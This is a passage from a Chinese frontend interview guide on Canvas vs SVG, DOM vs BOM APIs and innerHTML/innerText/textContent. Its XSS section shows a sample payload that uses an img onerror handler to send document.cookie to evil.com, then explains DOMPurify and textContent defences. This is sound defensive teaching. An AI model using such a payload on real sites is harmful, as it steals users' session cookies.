> 图形数量 < 500 且需要交互 → **SVG**
> 图形数量 > 1000 或需要像素级操作 → **Canvas**
> 两者之间 → 根据具体场景权衡

#### 9.3 代码级示例

**Canvas 完整工作流（高清屏适配 + 动画）：**
```javascript
const canvas = document.getElementById('myCanvas');
const ctx = canvas.getContext('2d');

// 高清屏适配（必须）
const dpr = window.devicePixelRatio || 1;
const rect = canvas.getBoundingClientRect();
canvas.width = rect.width * dpr;
canvas.height = rect.height * dpr;
ctx.scale(dpr, dpr); // 将逻辑像素坐标系缩放回 CSS 像素坐标系

// 绑定图形
ctx.fillStyle = '#ff6b6b';
ctx.beginPath();
ctx.arc(100, 100, 50, 0, Math.PI * 2);
ctx.fill();

// 动画循环（游戏场景）
let angle = 0;
function animate() {
  ctx.clearRect(0, 0, canvas.width, canvas.height); // 清空画布
  angle += 0.05;
  ctx.save();
  ctx.translate(rect.width / 2, rect.height / 2);
  ctx.rotate(angle);
  ctx.fillRect(-25, -25, 50, 50);
  ctx.restore();
  requestAnimationFrame(animate);
}
animate();

// 导出为图片
const dataUrl = canvas.toDataURL('image/png');
```

**SVG 完整工作流（交互 + CSS + 动画）：**
```html
<svg viewBox="0 0 200 200" width="200" height="200">
  <!-- CSS 控制样式 -->
  <style>
    .bar { fill: #4ecdc4; transition: fill 0.2s; }
    .bar:hover { fill: #ff6b6b; cursor: pointer; }
  </style>

  <!-- DOM 事件天然支持 -->
  <rect class="bar" x="10" y="10" width="50" height="80"
        data-value="80"
        onclick="console.log('Clicked!', this.dataset.value)"
        onmouseover="console.log('Value:', this.dataset.value)"/>
</svg>

<!-- 通过 JS 操作 SVG DOM -->
<script>
  const rect = document.querySelector('.bar');
  rect.setAttribute('fill', '#f39c12');
  rect.style.transform = 'scale(1.1)'; // CSS transform 驱动
</script>
```

#### 9.4 Canvas 内存管理与高清屏适配

```javascript
// Canvas 内存泄漏常见原因
// 1. requestAnimationFrame 循环未停止
let animId;
function animate() {
  draw();
  animId = requestAnimationFrame(animate);
}
animate();
// 页面切换时未清理
window.addEventListener('unload', () => cancelAnimationFrame(animId));

// 2. Canvas 内容未清空导致离屏缓存占用
// 离屏 Canvas 应在不用时设为 null
let offscreenCanvas = null;
function createOffscreenBuffer() {
  offscreenCanvas = document.createElement('canvas');
  // ...
}
// 清理
function cleanup() {
  offscreenCanvas = null;
}
```

#### 9.5 SVG 常见性能问题与优化

| 问题 | 原因 | 解决方案 |
|------|------|---------|
| SVG 内存泄漏 | 每个 SVG 节点是活跃的 DOM 对象 | 减少 SVG 中的 `<style>` 标签；用 CSS 类替代 |
| SVG 重绘慢 | 复杂路径在每次 DOM 变化时重新光栅化 | 用 `will-change: transform` 提示 GPU 加速 |
| SVG 首屏渲染慢 | 内嵌 SVG 大文件阻塞解析 | 外部引用 `<img src="icon.svg">` 而非内嵌 |
| SVG 不支持多线程解析 | SVG 解析在主线程 | 大型 SVG 考虑转为 Canvas 绘制一次 |

**SVG 首屏优化：**
```html
<!-- ❌ 内嵌 SVG 大文件（阻塞 HTML 解析） -->
<svg>...5000 行 SVG...</svg>

<!-- ✅ 外部引用（不阻塞解析，懒加载） -->
<img src="/illustrations/hero.svg" alt="Hero" width="800" height="600">

<!-- ✅ 小图标用内嵌（减少请求数） -->
<svg width="24" height="24"><path d="..."/></svg>
```

#### 9.6 高频面试追问

**Q1：Canvas 能实现 SVG 的放大不失真吗？**
> 不能。Canvas 是位图，放大后像素化。但可以通过**矢量图转 Canvas 预绘制**方案：外部 SVG 文件加载后，绘制到 Canvas，后续缩放操作只缩放 Canvas 位图，看起来不失真——但本质还是位图放大，不是真矢量。

**Q2：在 Vue/React 中渲染 10000 个数据点的折线图，用 Canvas 好还是 SVG 好？**
> Canvas。SVG 10000 个 DOM 节点会让浏览器渲染树爆炸（每个 `<path>`/`<circle>` 都是独立节点），即使有虚拟 DOM 也会因为节点数过多导致 diff 成本极高。Canvas 只需一个 `<canvas>` 元素 + JS 遍历 10000 个数据点绑制像素。

**Q3：Canvas 的 `toBlob()` 和 `toDataURL()` 有什么区别？**
> `toDataURL()` 返回 Base64 编码字符串（体积大 33%），`toBlob()` 返回 `Blob` 对象（体积小，可流式上传）。生产环境应优先用 `canvas.toBlob(callback, 'image/png', 0.9)`。

> 📚 参考：
> - [MDN — Canvas API](https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API)
> - [MDN — SVG](https://developer.mozilla.org/en-US/docs/Web/SVG)
> - [Google Web Fundamentals — Canvas vs SVG](https://developers.google.com/web/fundamentals/design-and-ux/graphics/choosing-effective-m格式)

---

# Section 10: DOM vs BOM 区别

## 10.1 核心概念

### DOM — Document Object Model（文档对象模型）

DOM 是 W3C 定义的**标准规范**，描述了如何将 HTML/XML 文档表示为对象结构。它是**语言无关的**（language-agnostic）API，JavaScript、Python、Java 等均可操作 DOM。

核心特点：
- **W3C 标准**：所有浏览器严格遵循（高度一致）
- **操作文档内容**：元素、属性、文本节点
- 以 `document` 对象为根节点的一棵树形结构

### BOM — Browser Object Model（浏览器对象模型）

BOM 是浏览器厂商提供的**非标准扩展**，用于访问和操作浏览器窗口本身。不同浏览器实现不同，没有统一规范。

核心特点：
- **无统一标准**：各浏览器实现差异大（IE vs Chrome vs Firefox）
- **操作浏览器环境**：窗口、历史记录、地址栏、屏幕信息
- 以 `window` 对象为全局根对象

### 两者关系

```
window (BOM 顶级对象)
 ├── document    ──► DOM 的入口（HTMLDocument 类型的实例）
 ├── navigator   ──► 浏览器信息
 ├── location    ──► URL 信息与导航
 ├── history     ──► 访问历史
 ├── screen      ──► 屏幕信息
 ├── frames      ──► 子窗口（iframe）
 ├── localStorage / sessionStorage
 ├── XMLHttpRequest / fetch
 ├── alert() / confirm() / prompt()
 ├── setTimeout / setInterval
 └── ...（更多浏览器 API）
```

**关键关系**：`window.document` 是 DOM 的入口——DOM 嵌在 BOM 内，DOM 是 BOM 的子集。

---

## 10.2 对象层级结构图

```
┌─────────────────────────────────────────────────────────┐
│                      window (BOM 全局对象)               │
│  ┌─────────────────────────────────────────────────────┤
│  │  BOM 对象                                            │
│  │  ├── navigator  ── 用户代理、浏览器信息               │
│  │  ├── location   ── URL、协议、路径、查询参数          │
│  │  ├── history    ── 浏览器历史记录栈                   │
│  │  ├── screen     ── 屏幕分辨率、色深                    │
│  │  ├── frames[]   ── 子窗口 / iframe 引用              │
│  │  ├── localStorage / sessionStorage                   │
│  │  ├── indexedDB                                          │
│  │  ├── postMessage / addEventListener                   │
│  │  ├── alert / confirm / prompt                       │
│  │  ├── setTimeout / setInterval                       │
│  │  └── open / close                                   │
│  │                                                      │
│  │  DOM 对象（通过 window.document 访问）                │
│  │  └── document ──► HTMLDocument                       │
│  │       ├── getElementById()                          │
│  │       ├── querySelector()                            │
│  │       ├── createElement()                            │
│  │       ├── forms / images / links（集合）             │
│  │       ├── body                                      │
│  │       └── cookie / domain / title / URL              │
│  │                                                      │
│  │  Element 节点（Node 子类型）                          │
│  │  ├── HTMLDivElement                                 │
│  │  ├── HTMLInputElement                               │
│  │  ├── HTMLElement                                   │
│  │  └── SVGElement                                    │
│  │                                                      │
│  │  Text / Comment / DocumentFragment 等 Node 子类型     │
│  └─────────────────────────────────────────────────────┘
└─────────────────────────────────────────────────────────┘
```

---

## 10.3 DOM 详解

### 10.3.1 核心 API

```typescript
// 获取元素
const elem = document.getElementById('app');     // 已知 ID
const elems = document.getElementsByTagName('div');  // 标签名（live HTMLCollection）
const elems = document.getElementsByClassName('card'); // 类名（live HTMLCollection）
const elem = document.querySelector('.container');   // 单个匹配（CSS 选择器）
const elems = document.querySelectorAll('div.card'); // 所有匹配（static NodeList）

// 创建元素
const div = document.createElement('div');
div.id = 'dynamic';
div.className = 'wrapper';
div.textContent = 'Hello';         // 纯文本，不解析 HTML
div.innerHTML = '<span>Bold</span>'; // 解析 HTML（有 XSS 风险）

// 插入/移除 DOM
document.body.appendChild(div);
parent.insertBefore(newNode, referenceNode);
parent.replaceChild(newChild, oldChild);
element.remove();                  // 现代 API（IE 不支持）
element.removeChild(child);       // 经典 API

// 元素属性操作
element.setAttribute('data-id', '123');
element.getAttribute('data-id');
element.hasAttribute('disabled');
element.removeAttribute('disabled');

// 类名操作（推荐）
element.classList.add('active');
element.classList.remove('hidden');
element.classList.toggle('expanded');
element.classList.contains('selected');

// 样式操作
element.style.color = 'red';
element.style.backgroundColor = '#f0f0f0'; // 注意驼峰命名
```

### 10.3.2 DOM 节点类型（Node Types）

```typescript
// 每个节点都有 nodeType 属性
enum NodeType {
  ELEMENT_NODE               = 1,   // <div> <p>
  TEXT_NODE                 = 3,   // 文本内容
  COMMENT_NODE              = 8,   // <!-- comment -->
  DOCUMENT_NODE             = 9,   // document 本身
  DOCUMENT_FRAGMENT_NODE     = 11, // DocumentFragment
  DOCUMENT_TYPE_NODE        = 10, // <!DOCTYPE html>
}

// Node 常用属性和方法
const textNode = document.createTextNode('Hello');
textNode.nodeType;   // 3
textNode.nodeName;   // '#text'
textNode.textContent; // 'Hello'

// 节点关系遍历
element.parentNode;
element.parentElement;
element.children;           // 只含元素节点（HTMLCollection）
element.childNodes;         // 含文本、注释等所有节点（NodeList）
element.firstChild;
element.lastChild;
element.nextSibling;
element.previousSibling;

// Element 特有的遍历
element.closest('.container'); // 向上查找匹配选择器的最近祖先
element.matches('.card');     // 检查元素是否匹配选择器
```

### 10.3.3 React/TypeScript 中的 DOM 操作

```tsx
// 在 React 中，直接操作 DOM 的场景（ref）：
function FocusInput() {
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // 直接调用 DOM API（非 React 渲染流程）
    inputRef.current?.focus();
  }, []);

  return <input ref={inputRef} type="text" />;
}

// 手动创建复杂 DOM 结构（不推荐，但在低抽象层有用）
function createCard(title: string, body: string): HTMLElement {
  const card = document.createElement('div');
  card.className = 'card';
  card.setAttribute('role', 'article');

  const heading = document.createElement('h2');
  heading.textContent = title;
  heading.className = 'card__title';

  const content = document.createElement('p');
  content.textContent = body;
  content.className = 'card__body';

  card.appendChild(heading);
  card.appendChild(content);

  return card;
}

// 监听 DOM 事件
document.getElementById('btn')?.addEventListener('click', (e: MouseEvent) => {
  const target = e.currentTarget as HTMLElement;
  target.classList.toggle('active');
});
```

---

## 10.4 BOM 详解

### 10.4.1 window 对象

```typescript
// window 是全局对象，以下写法等效：
window.document === document;
window.setTimeout === setTimeout;
window.alert === alert;

// 窗口尺寸
window.innerWidth;   // 视口宽度（含滚动条）
window.innerHeight;  // 视口高度
window.outerWidth;   // 浏览器窗口总宽度（含工具栏）
window.outerHeight;  // 浏览器窗口总高度
window.resizeTo(1024, 768);
window.moveTo(100, 200);

// 滚动
window.scrollY;       // 垂直滚动位置
window.scrollTo(0, 0); // 滚动到顶部
window.scrollBy(0, 100); // 相对滚动

// 屏幕可用区域
window.screenX;  // 窗口左边缘到屏幕左边缘的距离
window.screenY;
```

### 10.4.2 navigator 对象 — 浏览器信息

```typescript
// ⚠️ 不要用 appName / appVersion 判断浏览器类型（不准确）
navigator.appName;    // 'Netscape'（所有现代浏览器都是）
navigator.appVersion; // 浏览器版本字符串（不可靠）
navigator.platform;   // 操作系统信息

// ✅ 推荐：使用 userAgent（配合正则匹配已知浏览器）
const ua = navigator.userAgent;
const isFirefox = /Firefox/i.test(ua);
const isSafari = /Safari/i.test(ua) && !/Chrome/i.test(ua);
const isEdge = /Edg/i.test(ua);

// 现代浏览器检测（Feature Detection 优先）
const isSecure = location.protocol === 'https:';
const hasTouch = 'ontouchstart' in window;
const hasPointerEvents = window.matchMedia('(pointer: fine)').matches;

// Service Worker 与 PWA
navigator.serviceWorker?.register('/sw.js');
navigator.share?.({ title: 'Title', url: location.href }); // Web Share API

// 硬件信息（需权限）
// 内存（Chrome 限制）
const deviceMemory = (navigator as any).deviceMemory; // GB（可能是 4 或 8）
// CPU 核心数
const hardwareConcurrency = navigator.hardwareConcurrency;

// 网络信息（网络信息 API）
if ('connection' in navigator) {
  const conn = (navigator as any).connection;
  conn.effectiveType; // '4g', '3g', '2g', 'slow-2g'
  conn.downlink;      // Mbps（估算带宽）
  conn.rtt;           // 毫秒
  conn.addEventListener('change', () => console.log(conn.effectiveType));
}

// 电池状态（Battery API）
if ('getBattery' in navigator) {
  (navigator as any).getBattery().then((battery: any) => {
    console.log(`Battery: ${battery.level * 100}%`);
    console.log(`Charging: ${battery.charging}`);
  });
}
```

### 10.4.3 location 对象 — URL 与导航

```typescript
// URL 各部分
location.href;       // 完整 URL（可读写）
location.protocol;   // 'https:'
location.host;       // 'example.com:8080'
location.hostname;   // 'example.com'
location.port;       // '8080'（空字符串表示默认端口）
location.pathname;   // '/path/to/page'
location.search;     // '?foo=bar&baz=123'
location.hash;       // '#section-id'

// 解析查询参数
const params = new URLSearchParams(location.search);
params.get('foo');   // 'bar'
params.set('page', '2');
history.replaceState(null, '', `?${params.toString()}`);

// 导航
location.assign('https://example.com/new-page');  // 触发跳转（写入历史）
location.replace('https://example.com/new-page'); // 替换当前（不写入历史）
location.reload();                                  // 刷新页面

// 从 URL 解析数据（TypeScript 工具函数）
function parseUrl(url: string) {
  const { protocol, host, pathname, search, hash } = new URL(url);
  return { protocol, host, pathname, search, hash };
}

const parsed = parseUrl('https://example.com/search?q=react&page=1#results');
console.log(parsed.search); // '?q=react&page=1'
```

### 10.4.4 history 对象 — 历史记录

```typescript
// 导航
history.back();      // 后退一页
history.forward();  // 前进一页
history.go(-2);     // 后退两页

// 替换/添加历史记录（不刷新页面）
history.pushState(stateObj, title, url);
history.replaceState(stateObj, title, url);

// 监听 popstate（浏览器前进/后退触发）
window.addEventListener('popstate', (event) => {
  console.log('state:', event.state);
  // ⚠️ pushState/replaceState 不触发 popstate
});

// SPA 路由示例（结合 history）
function navigate(path: string) {
  history.pushState({ page: path }, '', path);
  renderPage(path);  // 手动渲染对应页面
}

window.addEventListener('popstate', () => {
  renderPage(location.pathname);
});
```

### 10.4.5 screen 对象 — 屏幕信息

```typescript
screen.width;       // 屏幕总宽度（像素）
screen.height;      // 屏幕总高度（像素）
screen.availWidth;  // 浏览器可用宽度（减去任务栏等）
screen.availHeight; // 浏览器可用高度
screen.colorDepth;  // 颜色深度（如 24）
screen.pixelDepth;  // 像素深度（如 24）

// 布局相关：设备像素比（DPR）
const dpr = window.devicePixelRatio; // 通常 1, 2, 或 3
// 高清屏适配：画布或图片使用 @2x 资源
if (dpr > 1) {
  canvas.width = designWidth * dpr;
  canvas.height = designHeight * dpr;
  ctx.scale(dpr, dpr);
}
```

### 10.4.6 其他重要 BOM API

```typescript
// Storage
localStorage.setItem('theme', 'dark');      // 持久存储（5-10MB）
sessionStorage.setItem('tabId', '123');   // 会话级存储（关闭标签页清除）
localStorage.removeItem('theme');

// 定时器
const timerId = setTimeout(() => alert('5s passed'), 5000);
clearTimeout(timerId);

const intervalId = setInterval(() => tick(), 1000);
clearInterval(intervalId);

// requestAnimationFrame（动画帧）
function animate(timestamp: number) {
  // 每帧调用，约 60fps
  element.style.transform = `translateX(${timestamp / 10}px)`;
  if (running) requestAnimationFrame(animate);
}
requestAnimationFrame(animate);

// alert / confirm / prompt（模态框）
const confirmed = confirm('Delete this item?'); // 返回 boolean
const name = prompt('Enter your name:', 'John'); // 返回 string 或 null

// open / close
const popup = window.open('https://example.com', 'popup', 'width=400,height=300');
popup?.close();

// 全屏 API
element.requestFullscreen();                          // 进入全屏
document.exitFullscreen();                             // 退出全屏
document.fullscreenElement; // 当前全屏元素或 null
```

---

## 10.5 DOM vs BOM 核心对比

| 维度 | DOM | BOM |
|------|-----|-----|
| 全称 | Document Object Model | Browser Object Model |
| 标准 | W3C 制定（标准规范） | 各浏览器厂商实现（无标准） |
| 规范程度 | 极高（所有浏览器一致） | 低（实现细节各异） |
| 核心对象 | `document` | `window` |
| 操作对象 | HTML/XML 文档的元素和内容 | 浏览器窗口本身 |
| 作用范围 | 文档内容（节点树） | 浏览器环境（窗口、导航、屏幕） |
| 与 JS 的关系 | 语言无关的 API | JS 与浏览器交互的桥梁 |
| 规范组织 | W3C DOM Working Group | WHATWG（Browser Environment）|
| 使用场景 | 动态修改页面内容 | 获取浏览器信息、导航、历史管理 |

---

## 10.6 实际应用：判断运行环境

```typescript
// 检测是否为浏览器环境
const isBrowser = typeof window !== 'undefined' && typeof document !== 'undefined';

// 检测 SSR（Next.js / Remix / Angular Universal）
const isSSR = typeof window === 'undefined';

// 检测 iOS/Android
const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
const isAndroid = /Android/i.test(navigator.userAgent);

// 检测是否为 WeChat 浏览器
const isWeChat = /MicroMessenger/i.test(navigator.userAgent);

// 检测是否支持某些 API（Feature Detection）
const hasIntersectionObserver = 'IntersectionObserver' in window;
const hasWebSocket = 'WebSocket' in window;
const hasPointerEvents = window.matchMedia('(pointer: fine)').matches;

// 检测在线状态
window.addEventListener('online', () => console.log('Back online'));
window.addEventListener('offline', () => console.log('Lost connection'));
const isOnline = navigator.onLine;

// 检测视口方向（移动端）
const isLandscape = window.matchMedia('(orientation: landscape)').matches;
window.matchMedia('(orientation: portrait)').addEventListener('change', (e) => {
  console.log('Orientation changed:', e.matches ? 'portrait' : 'landscape');
});
```

---

## 10.7 面试追问

### Q1：为什么说 BOM 是浏览器厂商的私有实现，而 DOM 是 W3C 标准？

**答**：

**BOM 的私有性**：`window`、`navigator`、`location`、`history`、`screen` 这些对象不是 ECMA 或 W3C 规范的一部分，而是各浏览器在实现 JavaScript 引擎时额外暴露的 API。不同浏览器中：

```javascript
// IE 有一些 BOM 扩展（现在已废弃）
window.execScript;     // IE 私有
window.showModelessDialog; // IE 私有

// Chrome/Firefox 有各自的实现差异
// location 对象的 API 基本一致（WHATWG 规范了 URL 标准）
// 但 history.pushState 的行为在不同浏览器中仍可能有微小差异
```

**DOM 的标准性**：

```javascript
// W3C DOM 规范保证了这些 API 在所有浏览器中行为一致
document.getElementById('app');     // ✅ 跨浏览器完全一致
document.querySelectorAll('div');    // ✅ 跨浏览器完全一致
element.classList.add('active');    // ✅ 跨浏览器完全一致

// 但 DOM 实现仍有差异（如 IE 的 oldIE 实现 vs 现代浏览器）
// 现代浏览器的 DOM 实现高度一致（HTML5 规范统一后）
```

关键点：DOM 有规范文本（DOM4、DOM Living Standard），BOM 没有规范约束（现代浏览器趋于遵循 WHATWG 的 `window` 规范）。

---

### Q2：如何在不刷新页面的情况下改变 URL 并保持 SPA 路由正常工作？

**答**：使用 History API（属于 BOM）。

```typescript
// React Router 的核心原理：
// 1. pushState / replaceState 改变 URL（不刷新）
// 2. popstate 监听浏览器前进/后退

// 基础实现
function createRouter(routes: Record<string, () => void>) {
  function handleRoute() {
    const path = location.pathname; // BOM: location 对象
    const handler = routes[path] || routes['/'];
    handler();
  }

  // 监听导航
  window.addEventListener('popstate', handleRoute);

  // 暴露 navigate 函数
  return function navigate(path: string) {
    // 推入新历史记录（不刷新）
    history.pushState(null, '', path); // BOM: history 对象
    handleRoute();
  };
}

const router = createRouter({
  '/': () => renderHome(),
  '/about': () => renderAbout(),
  '/contact': () => renderContact(),
});

document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      router(link.getAttribute('href')!);
    });
  });
});
```

注意：`history.pushState` 和 `replaceState` **不会触发** `popstate` 事件，只有浏览器的前进/后退按钮会触发。手动点击链接需要用 `pushState` 配合自定义事件系统。

---

### Q3：window、document、navigator 之间的层级关系是什么？

**答**：

```
window（最外层，所有 BOM 对象的根容器）
  └── document（DOM 入口，HTMLDocument 实例）
        ├── querySelector / getElementById 等 DOM API
        └── cookie / domain / title / URL 等文档元数据

navigator（独立 BOM 对象，与 document 平级）
  └── userAgent / hardwareConcurrency / onLine 等浏览器信息

location（独立 BOM 对象）
  └── href / protocol / hostname / pathname / search / hash

history（独立 BOM 对象）
  └── back / forward / go / pushState / replaceState

screen（独立 BOM 对象）
  └── width / height / availWidth / availHeight
```

**记忆口诀**：
- `window` 是**最大的盒子**（整个浏览器窗口）
- `document` 是**盒子里的文档**（HTML 内容）
- `navigator` 是**盒子外面的标签**（告诉别人这是什么浏览器）
- `location` 是**盒子上的地址栏**（当前在哪里）
- `history` 是**盒子里的后退按钮**（访问历史）

---

## 10.8 常见坑与最佳实践

### 坑 1：在 SSR 环境中访问 window

```typescript
// ❌ 服务端渲染时会报错：window is not defined
const width = window.innerWidth;

// ✅ 正确做法：环境检测
if (typeof window !== 'undefined') {
  const width = window.innerWidth;
}

// ✅ React 中的正确做法：useEffect 只在客户端运行
function Component() {
  const [width, setWidth] = useState(0);
  useEffect(() => {
    setWidth(window.innerWidth);
  }, []);
  return <div>Width: {width}</div>;
}
```

### 坑 2：navigator.userAgent 不可靠

```typescript
// ❌ 依赖 UA 字符串判断浏览器类型（可伪造，且不准确）
if (navigator.userAgent.includes('Chrome')) {
  // chrome code
}

// ✅ 使用 Feature Detection（功能检测）
if ('IntersectionObserver' in window) {
  // 使用 IntersectionObserver
} else {
  // 回退方案
}
```

### 坑 3：BOM 对象属性访问返回不同类型

```typescript
// location.search 返回字符串（带 ?）
location.search; // '?foo=bar'
// 使用 URLSearchParams 解析
const params = new URLSearchParams(location.search);

// location.hash 返回字符串（带 #）
location.hash; // '#section'
// 直接去掉 # 号使用
const id = location.hash.slice(1);

// screen 对象可能在某些嵌入式环境中返回奇怪的值
screen.width; // 某些嵌入式设备可能是 0（安全考虑）
```

---

> 📚 参考：
> - https://www.cnblogs.com/chosen-yn/p/18458105
> - https://www.cnblogs.com/scg0624/p/9855540.html
> - https://www.cnblogs.com/lonelyshy/p/14272280.html
> - https://blog.csdn.net/bing_JavaScript/article/details/52618695

---

# Section 11: innerHTML vs innerText vs textContent

## 11.1 概念定义

这三个属性都是 DOM 用来读取或更新元素内容的接口，但行为各异：

| 属性 | 定义 | 返回值 |
|------|------|--------|
| `innerHTML` | 读写元素内部的 HTML 标记（包括标签和文本） | 包含 HTML 标签的字符串 |
| `innerText` | 读写元素内部可见的文本（CSS 感知，会触发回流） | 仅可见文本，受 CSS 样式影响 |
| `textContent` | 读写元素及所有后代节点的纯文本（raw） | 所有文本，不含 HTML 标签 |

```html
<div id="demo">
  <span style="display:none">hidden</span>
  <span>visible</span>
</div>
```

```javascript
const el = document.getElementById('demo');
el.innerHTML    // "<span style="display:none">hidden</span><span>visible</span>"
el.innerText    // "visible"        (考虑CSS可见性，无缩进格式化)
el.textContent  // "hiddenvisible"  (包含隐藏内容，原样输出所有文本)
```

## 11.2 性能对比

```
+---------------------------+---------------------------+---------------------------+
|         innerHTML         |         innerText         |       textContent         |
+---------------------------+---------------------------+---------------------------+
| 1. 解析 HTML 标记         | 1. 读取计算样式           | 1. 直接读取 DOM 节点       |
| 2. 构建 DOM 树            | 2. 考虑 CSS 可见性        | 2. 递归拼接文本节点        |
| 3. 触发完整的解析/渲染    | 3. 触发回流(reflow)       | 3. 无额外计算，最快        |
|    (最慢)                 |    (中等)                 |    (最快)                 |
+---------------------------+---------------------------+---------------------------+
```

**性能实测规律（Chrome DevTools Performance 面板）：**
- `textContent` 写入：O(n)，纯文本拼接，无 DOM 解析
- `innerText` 读取：O(n) + 样式计算，每次触发 `getComputedStyle`
- `innerHTML` 写入：O(n) + HTML 解析器 + DOM 构建，大文档下慢 5-10x

**写入时的性能差异尤为显著：** 当频繁更新内容时，`textContent` 是最高效的选择。

## 11.3 安全：innerHTML XSS 漏洞与防护

### XSS 攻击原理

```javascript
// 攻击者注入恶意脚本
const userInput = '<img src=x onerror="fetch(`//evil.com?c=${document.cookie}`)">';
document.getElementById('app').innerHTML = userInput;
// 恶意脚本将随图片加载自动执行
```

### 防护方案

| 方案 | 说明 | 适用场景 |
|------|------|----------|
| DOMPurify | HTML 清洗库，过滤危险标签/属性 | 生产环境首选 |
| textContent 替代 | 完全不解析 HTML，攻击无效 | 仅需纯文本时 |
| 白名单正则过滤 | 自定义过滤逻辑 | 轻量级场景 |
| CSP Content-Security-Policy | 浏览器端安全策略 | 服务端配合 |

**DOMPurify 示例：**

```javascript
import DOMPurify from 'dompurify';

const dirty = userInput; // 不可信输入
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
});
document.getElementById('app').innerHTML = clean;
```

```typescript
// React 中使用 DOMPurify
import DOMPurify from 'dompurify';

const SafeHTML = ({ html }: { html: string }) => {
  const sanitizer = typeof window !== 'undefined'
    ? DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })
    : html;
  return <div dangerouslySetInnerHTML={{ __html: sanitizer }} />;
};
```

**React 中 `dangerouslySetInnerHTML` 的风险：**

```tsx
// 危险：将用户输入直接传入
<p dangerouslySetInnerHTML={{ __html: userInput }} />

// 安全：先清洗再使用
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

## 11.4 现代替代方案

### insertAdjacentHTML / insertAdjacentText

```javascript
// 比 innerHTML 更细粒度地插入，效率更高
element.insertAdjacentHTML('beforeend', '<span>追加内容</span>');
element.insertAdjacentText('beforeend', '纯文本');
/*
beforebegin | <div>           | afterbegin
            | content         | beforeend
            | </div>          | afterend
afterend    |                 | beforebegin
*/
```

### 模板字面量（Template Literals）

```tsx
// React 函数组件
const UserCard = ({ name, avatar, bio }: UserProps) => (
  <div className="card">
    <img src={avatar} alt={name} />
    <h2>{name}</h2>
    <p>{bio}</p>
  </div>
);

// Vue 模板
const template = `<div class="card">
  <h2>${name}</h2>
  <p>${bio}</p>
</div>`;
```

**对比表格：**

| 场景 | 推荐方案 | 原因 |
|------|----------|------|
| 渲染用户提供的富文本 | DOMPurify + innerHTML | 需要保留格式但需防护 XSS |
| 渲染用户纯文本 | textContent | 最高效，无解析开销 |
| 需要获取样式感知文本 | innerText | 含 hidden 内容排除 |
| 动态替换整个元素内容 | innerHTML | 一次性替换 |
| 在元素末尾追加 HTML | insertAdjacentHTML | 局部插入，效率更高 |
| 在元素末尾追加纯文本 | insertAdjacentText | 局部插入，无 HTML 解析 |
| 搜索/过滤文本内容 | textContent | 最快，最准确 |
| 富文本编辑器 | contenteditable + 自定义 Model | 详见 Section 14 |

## 11.5 使用场景速查表

| 场景 | 选择 | 理由 |
|------|------|------|
| 向页面注入安全 HTML 片段 | DOMPurify.sanitize + innerHTML | 安全 + 保留格式 |
| 渲染纯文本内容 | textContent | 最高效，无 XSS 风险 |
| 获取用户看到的文本（含 CSS 效果） | innerText | 排除 `display:none` 等 |
| 动态替换整个元素内容 | innerHTML | 一次性替换 |
| 在元素末尾追加 HTML | insertAdjacentHTML | 局部插入，效率更高 |
| 在元素末尾追加纯文本 | insertAdjacentText | 局部插入，无 HTML 解析 |
| 搜索/过滤文本内容 | textContent | 最快，最准确 |
| 富文本编辑器 | contenteditable + 自定义 Model | 详见 Section 14 |

## 11.6 常见陷阱

```javascript
// 陷阱1: innerText 会受 display:none 影响
<div style="display:none">hidden text</div>
// innerText = ""（不可见文本被排除）
// textContent = "hidden text"（全部文本）

// 陷阱2: innerHTML 会执行 <script> 标签
el.innerHTML = '<script>alert(1)</script>'; // 不执行！
el.innerHTML = '<img src=x onerror="alert(1)">'; // 会执行！

// 陷阱3: innerText 在隐藏元素上读取返回空字符串
const hidden = document.createElement('div');
hidden.style.display = 'none';
hidden.textContent = 'foo';
hidden.innerText; // "" (Firefox/Chrome 均返回 "")
// textContent 始终返回 "foo"

// 陷阱4: 写入时 innerHTML 会丢失原有事件监听
const wrapper = document.getElementById('wrapper');
wrapper.innerHTML = '<button onclick="fn()">click</button>';
// 原 wrapper 上的事件监听全部丢失

// 陷阱5: IE 兼容性
// innerText: IE6+ 支持
// textContent: IE9+ 支持
// 需要兼容 IE8 时需做 polyfill
```

## 11.7 面试 follow-up 问题

### Q1: 如果一个 div 里有 `<span style="display:none">foo</span>bar`，三个属性的返回值分别是什么？为什么？

**答案：**
- `innerHTML` 返回完整 HTML 字符串：`<span style="display:none">foo</span>bar`
- `innerText` 返回可见文本（排除 hidden 内容）：`bar`
- `textContent` 返回所有文本节点：`foobar`

原因：`innerText` 是 CSS 感知的，会触发 `getComputedStyle`，不返回 `display:none` 元素的内容；`textContent` 是 raw 读取，遍历所有 Text 节点。

---

### Q2: 为什么说 React 的 `dangerouslySetInnerHTML` 是"危险的"？如何安全使用？

**答案：**
`dangerouslySetInnerHTML` 等同于直接操作 `innerHTML`，如果传入未经过滤的用户输入，会导致 DOM 型 XSS 攻击。安全使用方式：

```tsx
import DOMPurify from 'dompurify';

const sanitize = (html: string) => DOMPurify.sanitize(html);

const SafeContent = ({ html }: { html: string }) => (
  <div dangerouslySetInnerHTML={{ __html: sanitize(html) }} />
);
```

此外，现代编辑器（如 Tiptap、Lexical）采用自定义 Model 而非 `contenteditable`，从架构上规避了此类风险。

---

### Q3: 为什么频繁更新列表内容时推荐用 `textContent` 而不是 `innerHTML`？

**答案：**
`innerHTML` 每次写入都需要：
1. 字符串解析为 tokens
2. 构建临时 DOM 树
3. 计算样式（CSSOM）
4. 合并到主 DOM 树

而 `textContent` 只需将字符串直接写入 Text 节点，无解析过程。在 1000+ 条目的列表渲染中，`textContent` 比 `innerHTML` 快 5-10 倍，也更安全（无 XSS 风险）。

---

> 📚 参考：
> - https://blog.csdn.net/sunyctf/article/details/124873855 （innerHTML/innerText/textContent 区别）
> - https://blog.csdn.net/weixin_34184158/article/details/85584313 （innerHTML XSS 利用）
> - https://www.cnblogs.com/cybozu/p/17692802.html （DOMPurify 使用方法）
> - https://blog.csdn.net/qq_41444226/article/details/138995095 （DOMPurify XSS 防御）
> - https://www.cnblogs.com/delishcomcn/p/17645080.html （HTML5 拖拽事件）

---

